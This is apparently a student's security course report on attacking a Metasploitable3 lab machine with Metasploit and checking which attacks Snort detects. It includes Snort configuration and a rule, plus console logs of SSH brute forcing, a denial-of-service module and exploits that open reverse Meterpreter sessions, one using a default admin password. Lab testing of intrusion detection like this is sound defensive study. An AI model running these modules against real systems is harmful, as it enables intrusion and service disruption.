@@ -1,0 +1,86 @@
+﻿I started the assignment by installing the virtual machine using vagrant. This took a long time and required some tricks to make it work, such as manually downloading a jdk file that the system failed to download. Fortunately the solution was found from a bug report in github. Next, I installed Snort to the virtual machine. The configuration was rather complicated, but some web pages and YouTube videos (for example this: https://www.youtube.com/watch?v=l2w-fbyy6y0 and this: https://www.youtube.com/watch?v=wXFVLXIsZdA) helped. Also, it took a while to notice that by default all the rules in the downloaded community.rules file were commented out by default, which was a bit annoying. In addition to the community rules, I downloaded the registered user rules. Installing metasploit to the machine hosting the VM was more straightforward and I didn't encounter any problems there. 
+
+The to the attacks. I will first describe attacks that were detected by Snort, either by the downloaded (and uncommented rules) or by some additional configuration tweaking. And then I will describe attacks that were not detected at least by the rules that were in use. However what Snort detects and doesn't detect really depends largely on the configurations, so maybe it would be possible to configure rules for the undetected attacks, but I didn't try to add any extra rules in addition to those either directly in downloaded rules files, or those I removed from comments. Apologies that the rest of this report is probably very difficult to read without line breaks as it contains copy-paste from command console and metasploit shell.
+
+First attack was a port scan, which I tried both with nmap and with the port scanner implemented during the course. This was detected after making the following change to the snort.conf file (described in the second YouTube file described above): 
+
+<-- # Portscan detection.  For more information, see README.sfportscan
+preprocessor sfportscan: proto  { all } scan_type { portscan } sense_level { medium } --> 
+
+After this port scan was reported on the cmd prompt running Snort as:
+03/04-10:08:58.786817  [**] [122:5:1] (portscan) TCP Filtered Portscan [**] [Cla
+ssification: Attempted Information Leak] [Priority: 2] {PROTO:255} 192.168.5.122
+ -> 192.168.5.186
+After properly taking community.rules to use some additional “attempted information leak” notifications were seen.
+
+Then I tried a brute force password scan attack using metasploitable module auxiliary/scanner/ssh/ssh_login. This was detected after commenting out the following rule from indicator_scan.rules:
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"INDICATOR-SCAN SSH brute force login attempt"; flow:to_server,established,no_stream; content:"SSH-"; depth:4; detection_filter:track by_src, count 5, seconds 60; metadata:policy max-detect-ips drop, service ssh; reference:cve,2012-6066; reference:cve,2015-5600; classtype:misc-activity; sid:19559; rev:9;). Snort console detected this attack and showed it in console as:
+
+03/04-10:40:04.961430  [**] [1:19559:9] INDICATOR-SCAN SSH brute force login att
+empt [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.5.122:5631
+3 -> 192.168.5.186:22
+
+Next I tried some of the vulnerabilities listed in the Metasploitable3 wiki. 
+
+The vulnerability on ManageEngine (CVE-2015-8249) was successful but it was also detected by Snort.
+msf exploit(windows/http/manageengine_connectionid_write) > run
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] Creating JSP stager
+[*] Uploading JSP stager PaAew.jsp...
+[*] Executing stager...
+[*] Sending stage (179779 bytes) to 192.168.5.186
+[*] Meterpreter session 14 opened (192.168.5.122:4444 -> 192.168.5.186:51188) at 2018-03-04 21:03:10 +0200
+[!] This exploit may require manual cleanup of '../webapps/DesktopCentral/jspf/PaAew.jsp' on the target
+meterpreter > 
+[+] Deleted ../webapps/DesktopCentral/jspf/PaAew.jsp
+
+Snort detected it and displayed the following on the cmd console:
+
+03/04-10:25:08.880027  [**] [1:1054:14] SERVER-WEBAPP weblogic/tomcat .jsp view
+source attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP}
+ 192.168.5.122:54295 -> 192.168.5.186:8020
+
+SNMP vulnerability was succssfully run with module auxiliary/scanner/snmp/snmp_enum. 
+msf auxiliary(scanner/snmp/snmp_enum) > run
+
+[-] 192.168.5.186 SNMP request timeout.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/snmp/snmp_enum) > 
+
+This was detected by Snort as seen from this console output:
+03/04-12:28:08.222245  [**] [1:1411:19] PROTOCOL-SNMP public access udp [**] [Cl
+assification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.5.122:5235
+9 -> 192.168.5.186:161
+
+The Apache Struts vulnerability CVE-2016-3087 could be run with metasploit module exploit/multi/http/struts_dmi_rest_exec. This was successful and it opened a connection to the VM:
+
+msf exploit(multi/http/struts_dmi_rest_exec) > run
+[*] Started reverse TCP handler on 172.28.128.1:4444 
+[*] 192.168.5.186:8282 - Uploading exploit to DpSU.jar, and executing it.
+[*] Sending stage (53859 bytes) to 172.28.128.3
+[*] Meterpreter session 12 opened (172.28.128.1:4444 -> 172.28.128.3:51132) at 2018-03-04 20:58:44 +020 
+meterpreter > 
+Snort did not detect this attack, nothing was seen in the console.
+
+Axis2 (CVE-2010-0219) vulnerability was succesful with metasploit module exploit/multi/http/axis2_deployer:
+msf exploit(multi/http/axis2_deployer) > run
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[+] http://192.168.5.186:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
+[+] Successfully uploaded
+[*] Polling to see if the service is ready
+[*] Sending stage (53859 bytes) to 192.168.5.186
+[*] Meterpreter session 18 opened (192.168.5.122:4444 -> 192.168.5.186:51269) at 2018-03-04 21:09:30 +0200
+[+] Deleted webapps/axis2/WEB-INF/services/xEIsuFid.jar
+meterpreter > 
+This was not detected by Snort in any way at least with my configuration.
+
+IIS CVE-2015-1635 vulnerability was run with auxiliary/dos/http/ms15_034_ulonglongadd. This seems to have run successfully:
+msf auxiliary(dos/http/ms15_034_ulonglongadd) > run
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+Snort did not detect this one either.
+
+Further undetected attacks were for example the ElasticSearch attack and Jenkins attack but I won't include details to save space.
+
+The above contain at least minimum  detected 4 (required 3) and 5 (required 2) undetected attacks. I also tried a few others from the vulnerability list of Metasploitable3 but I won't include them all here due to readability and to save some words for the discussion about "Is it easier to fix the application than to detect attacks?"  The attack detection has multiple problems as discussed in the paper linked in the project description. Detecting attacks is very complicated and false positives create issues, and also attackers have multiple ways to cheat the detection systems: obfuscation, fragmentation etc. However applications are complex as well, and especially if using many third party libraries keeping track of vulnerabilities and keeping systems up to date is also very challenging. When using IDS systems, if they all are as complicated to configure as Snort, one really has to know what they are doing and it takes time and effort to do it properly. Fixing the application if problems are found is a must I would say, and using IDS will not mean that you would get away with sloppy design and not patching your systems. But IDS can be helpful with the huge amount of network traffic in complex systems and all the time increasingly complex attacks, especially if a corporation has no resources to spare for manual intrusion detection. This touches on the machine learning essay written earlier on this course, and future possibilities of using machine learning more in intrusion detection. I will keep to the opinion I had in that essay that automatic detection is a must with the huge amount of data to analyze, and the combination of analysts and supervised learning for machine intelligence seems like a good path for now.
